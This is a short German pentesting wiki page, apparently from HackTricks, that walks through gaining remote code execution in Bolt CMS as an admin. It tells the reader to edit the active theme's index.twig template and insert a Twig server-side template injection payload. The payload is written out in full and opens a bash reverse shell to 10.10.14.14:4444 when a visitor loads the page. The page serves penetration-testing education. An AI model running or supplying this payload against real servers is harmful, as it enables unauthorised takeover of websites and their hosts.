# Bolt CMS

{{#include ../../banners/hacktricks-training.md}}

## RCE

Nach dem Login als Admin (gehen Sie zu /bot, um die Anmeldemaske zu erreichen), können Sie RCE in Bolt CMS erhalten:

- Wählen Sie `Configuration` -> `View Configuration` -> `Main Configuration` oder gehen Sie zum URL-Pfad `/bolt/file-edit/config?file=/bolt/config.yaml`
- Überprüfen Sie den Wert des Themas

<figure><img src="../../images/image (771).png" alt=""><figcaption></figcaption></figure>

- Wählen Sie `File management` -> `View & edit templates`
- Wählen Sie das im vorherigen Schritt gefundene Basis-Thema (`base-2021` in diesem Fall) und wählen Sie `index.twig`
- In meinem Fall befindet sich dies im URL-Pfad /bolt/file-edit/themes?file=/base-2021/index.twig
- Setzen Sie Ihr Payload in diese Datei über [template injection (Twig)](../../pentesting-web/ssti-server-side-template-injection/#twig-php), wie: `{{['bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"']|filter('system')}}`
- Und speichern Sie die Änderungen

<figure><img src="../../images/image (948).png" alt=""><figcaption></figcaption></figure>

- Leeren Sie den Cache in `Maintenance` -> `Clear the cache`
- Greifen Sie erneut als regulärer Benutzer auf die Seite zu, und das Payload sollte ausgeführt werden

{{#include ../../banners/hacktricks-training.md}}
